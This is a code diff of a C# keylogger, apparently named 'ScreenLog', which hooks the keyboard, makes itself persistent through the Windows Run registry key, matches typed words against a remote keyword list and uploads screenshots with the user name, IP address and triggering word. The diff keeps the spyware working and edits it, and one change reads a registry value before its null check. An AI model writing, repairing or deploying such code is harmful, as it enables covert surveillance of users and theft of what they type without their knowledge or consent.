@@ -35,10 +35,10 @@ namespace keystroke
         [STAThread]
         static void Main()
         {
-            String thisprocessname = Process.GetCurrentProcess().ProcessName;
+            //String thisprocessname = Process.GetCurrentProcess().ProcessName;
 
-            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
-                return;
+            //if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
+            //    return;
 
 
             try
@@ -46,18 +46,26 @@ namespace keystroke
                 RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                 object currentValue = read.GetValue("ScreenLog");
 
-                if (currentValue == null || String.Compare(currentValue.ToString(), Application.ExecutablePath, true) != 0)
+                string val = currentValue.ToString();
+                string exe_path = Application.ExecutablePath;
+                if (currentValue == null || val != exe_path)
                 {
                     RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                     add.SetValue("ScreenLog", Application.ExecutablePath);
                 }
+
+                //if (currentValue == null || String.Compare(val, Application.ExecutablePath, true) != 0)
+                //{
+                //    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                //    add.SetValue("ScreenLog", Application.ExecutablePath);
+                //}
                 //else
                 //    MessageBox.Show("You are welcome");
             }
             catch (Exception ex)
             {
                 MessageBox.Show("Please run as administrator");
-                //return;
+                return;
             }
 
             //MessageBox.Show("You are welcome1");
@@ -66,7 +74,7 @@ namespace keystroke
             //MessageBox.Show("You are welcome2");
             getWordList();
             //MessageBox.Show("You are welcome3");
-            
+
             _hookID = SetHook(_proc);
             //MessageBox.Show("You are welcome4");
 
@@ -76,7 +84,7 @@ namespace keystroke
             //MessageBox.Show("You are welcome6");            
             //Application.Run(new Form1());
             Application.Run();
-            UnhookWindowsHookEx(_hookID);
+            //UnhookWindowsHookEx(_hookID);
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -115,7 +123,7 @@ namespace keystroke
                 return;
             }
 
-            string []list = result.Split(',');
+            string[] list = result.Split(',');
             for (int i = 0; i < list.Count(); i++)
             {
                 spy_list.Add(list[i]);
@@ -194,12 +202,12 @@ namespace keystroke
                 Console.WriteLine((Keys)vkCode);
 
                 if (vkCode == 13 || vkCode == 9 || vkCode == 32)
-                {                    
+                {
                     bool exist = false;
 
                     for (int i = 0; i < spy_list.Count; i++)
                     {
-                         if (word.ToLower().Contains(spy_list[i].ToLower()))
+                        if (word.ToLower().Contains(spy_list[i].ToLower()))
                         {
                             exist = true;
                             break;
@@ -213,7 +221,7 @@ namespace keystroke
                         string ipAddr = GetLocalIPAddress();
                         uploadImage(path, urName, ipAddr, word);
                     }
-                        
+
                     word = "";
                 }
                 else
@@ -231,11 +239,11 @@ namespace keystroke
                         char character = (char)vkCode;
                         word += character.ToString();
                     }
-                        
+
                     Console.WriteLine(word);
                 }
 
-                
+
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
